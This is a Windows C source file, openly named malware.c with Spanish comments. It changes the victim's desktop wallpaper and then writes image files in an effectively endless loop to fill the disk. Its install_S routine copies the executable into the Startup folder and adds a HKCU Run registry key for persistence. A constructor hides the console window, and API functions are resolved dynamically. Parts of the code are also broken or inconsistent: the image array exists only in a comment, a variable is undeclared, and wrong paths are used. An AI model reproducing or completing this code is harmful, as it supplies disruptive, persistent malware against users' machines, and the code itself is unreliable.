#ifdef _WIN32

#include "malware.h"

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")

// gcc malware.c -o malware.exe -D __DEBUG__ -lole32 -luuid

/*
    unsigned char ayumu_kasuga[] = {
        0x90, 0x90, 0x90
    };
*/

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (!GetUserName(username, &username_len))
    {
#ifdef __DEBUG__
        PRINT_WINAPI_CONST("Error al obtener el usuario");
#endif
        return EXIT_FAILURE;
    }

    // ruta de los archivos generados:
    CHAR szPath1[MAX_PATH];
    PathCombineA(szPath1, RUTA_WALLPAPER, username);
    // "C:\\Users\\" + "Desmon0x90\\" = "C:\\Users\\Desmon0x90\\"

    // Ruta del archivo que usar para poner el fondo:
    CHAR szPath2[MAX_PATH];
    PathCombineA(szPath2, szPath1, NAME_WALLPAPER_FILE);
    // "C:\\Users\\Desmon0x90\\" + "ayumu_kasuga.jpeg" = "C:\\Users\\Desmon0x90\\ayumu_kasuga.jpeg"

    // Abrir o crear el archivo
    HANDLE hFile = CreateFile(szPath2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
#ifdef __DEBUG__
        PRINT_WINAPI_CONST(ERROR_CREATE_OPEN_FILE)
        PRINT_WINAPI_CONST(szPath2)
#endif
        return EXIT_FAILURE;
    }

    // Escribir en el archivo
    if (!WriteFile(hFile, ayumu_kasuga, sizeof(ayumu_kasuga), &dwBytesWritten, NULL))
    {
#ifdef __DEBUG__
        PRINT_WINAPI_CONST(ERROR_WRITE_FILE)
#endif
        CloseHandle(hFile);
        return EXIT_FAILURE;
    }
    CloseHandle(hFile);

    // cambiar el fondo de escritorio
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)szPath2, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    PWSTR path;
    HRESULT result = SHGetKnownFolderPath(&FOLDERID_Desktop, 0, NULL, &path);
    if (result != S_OK)
    {
#ifdef __DEBUG__
        PRINT_WINAPI_CONST(ERROR_GET_DIR "del directorio Escritorio\n")
#endif
        return EXIT_FAILURE;
    }
    CHAR szDesktopPath[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, path, -1, szDesktopPath, MAX_PATH, NULL, NULL);
    HANDLE hwHandle = GetProcessHeap();
    CoTaskMemFree(path);
    // for (ULONGLONG fileNumber = 0; fileNumber <= 10; fileNumber++)
    for (ULONGLONG fileNumber = 0; fileNumber <= 0xFFFFFFFFFFFFFF; fileNumber++)
    {
        
        TCHAR szFileName[MAX_PATH], szFilePath[MAX_PATH];
        StringCchPrintf(szFileName, MAX_PATH, TEXT("%llu.jpg"), fileNumber);
        PathCombineW(szFilePath, szDesktopPath, szFileName);
        puts("a");
        HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD dwBytesWritten = 0;
        WriteFile(hFile, ayumu_kasuga, sizeof(ayumu_kasuga), &dwBytesWritten, NULL);
        CloseHandle(hFile);
    }

    return EXIT_SUCCESS;
}

BOOL install_S()
{
    TCHAR executablePath[MAX_PATH], startupPath[MAX_PATH], destinationPath[MAX_PATH];

    // Obtener la ruta del archivo ejecutable actual
    GetModuleFileName(NULL, executablePath, MAX_PATH);
    //puts("a");

    // Obtener la ruta de inicio del usuario
    if (FAILED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath)))
    {
        return FALSE;
    }

    // Verificar si SHGetFolderPath devolvi칩 un valor v치lido
    if (!PathFileExists(startupPath))
    {
        return FALSE;
    }

    // Obtener el nombre de archivo sin extensi칩n
    TCHAR fileName[MAX_PATH];
    PathFindFileName(executablePath);
    PathRemoveExtension(executablePath);
    lstrcpy(fileName, executablePath);

    // Combinar las rutas de destino
    if (FAILED(PathCombine(destinationPath, startupPath, fileName)))
    {
        return FALSE;
    }

    // Verificar si el archivo ya existe en la ruta de destino
    if (PathFileExists(destinationPath))
    {
        return TRUE;
    }

    // Copiar el archivo
    if (!CopyFile(executablePath, destinationPath, FALSE))
    {
        return FALSE;
    }

    // Obtener el nombre de archivo sin extensi칩n
    TCHAR name[MAX_PATH];
    PathFindFileName(executablePath);
    PathRemoveExtension(executablePath);
    lstrcpy(name, executablePath);

    // Combinar la ruta de valor
    TCHAR value[MAX_PATH];
    if (FAILED(PathCombine(value, startupPath, name)))
    {
        return FALSE;
    }

    // Verificar si la clave ya existe en el registro
    HKEY hkey;
    LONG regQueryResult = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_READ, &hkey);
    if (regQueryResult != ERROR_SUCCESS)
    {
        return FALSE;
    }

    DWORD valueSize = MAX_PATH;
    LPBYTE valueData = (LPBYTE)malloc(valueSize);
    regQueryResult = RegQueryValueEx(hkey, name, NULL, NULL, valueData, &valueSize);
    if (regQueryResult == ERROR_SUCCESS)
    {
        // La clave ya existe en el registro
        RegCloseKey(hkey);
        free(valueData);
        return TRUE;
    }

    // La clave no existe, agregar una entrada al registro de Windows
    RegCloseKey(hkey);
    regQueryResult = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hkey);
    if (regQueryResult != ERROR_SUCCESS)
    {
        free(valueData);
        return FALSE;
    }

    LONG regSetValueResult = RegSetValueEx(hkey, name, 0, REG_SZ, (LPBYTE)value, (lstrlen(value) + 1) * sizeof(TCHAR));
    if (regSetValueResult != ERROR_SUCCESS)
    {
        RegCloseKey(hkey);
        free(valueData);
        return FALSE;
    }

    // Agregado correctamente, cerrar el registro
    RegCloseKey(hkey);
    free(valueData);

    return TRUE;

}


void __attribute__((constructor)) __init1__()
{

#ifndef __DEBUG__
    // Escondemos la ventana de la consola
    ShowWindow(GetConsoleWindow(), SW_HIDE);
#else
    hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    // puntero de textos y variable de longitud texto:
#endif
    hShlwapi = LoadLibraryA(TEXT("shlwapi.dll"));
    if (hShlwapi == NULL)
    {
#ifdef __DEBUG__
        PRINT_WINAPI_CONST(ERROR_LOAD "shlwapi.dll\n");
#endif
    }

    PathCombineA = (PathCombineA_t)GetProcAddress(hShlwapi, "PathCombineA");
    PathCombineW = (PathCombineW_t)GetProcAddress(hShlwapi, "PathCombineW");
    PathCombine = (PathCombineW_t)GetProcAddress(hShlwapi, "PathCombine");
    //PathFindFileNameA = (PathFindFileNameA_t)GetProcAddress(hShlwapi, "PathFindFileNameA");
    PathFindFileName = (PathFindFileName_t)GetProcAddress(hShlwapi, "PathFindFileName");
    //PathFindFileNameWithoutExtension = (PathFindFileNameWithoutExtension_t)GetProcAddress(hShlwapi, "PathFindFileNameWithoutExtension");
    PathFileExists = (PathFileExists_t)GetProcAddress(hShlwapi, "PathFileExists");
    
    lstrcpy = (lstrcpy_t)GetProcAddress(hShlwapi, "lstrcpyW");
    PathRemoveExtension = (PathRemoveExtension_t)GetProcAddress(hShlwapi, "PathRemoveExtension");


    if (PathCombineA == NULL)
    {
#ifdef __DEBUG__
        PRINT_WINAPI_CONST(ERROR_LOAD "PathCombineA de shlwapi.dll\n");
#endif
        FreeLibrary(hShlwapi);
    }
#ifndef SHLOBJ_H
    hShell32 = LoadLibrary(TEXT("shell32.dll"));
    if (hShell32 == NULL)
    {
        PRINT_WINAPI_CONST(ERROR_LOAD "shell32.dll\n");
    }
    SHGetKnownFolderPath = (SHGetKnownFolderPath_t)GetProcAddress(hShell32, "SHGetKnownFolderPath");
    if (SHGetKnownFolderPath == NULL)
    {
        PRINT_WINAPI_CONST(ERROR_LOAD "SHGetKnownFolderPath de shell32.dll\n");
    }
#endif
    //install_S();
}
void __attribute__((destructor)) __end1__()
{
#ifndef _SHLWAPI_H_
    FreeLibrary(hShlwapi);
#endif
#ifndef SHLOBJ_H
    FreeLibrary(hShell32);
#endif
}

#else
#error "Este codigo esta creado usando la WinApi, por ende solo se puedo compilar en sistemas windows"
#endif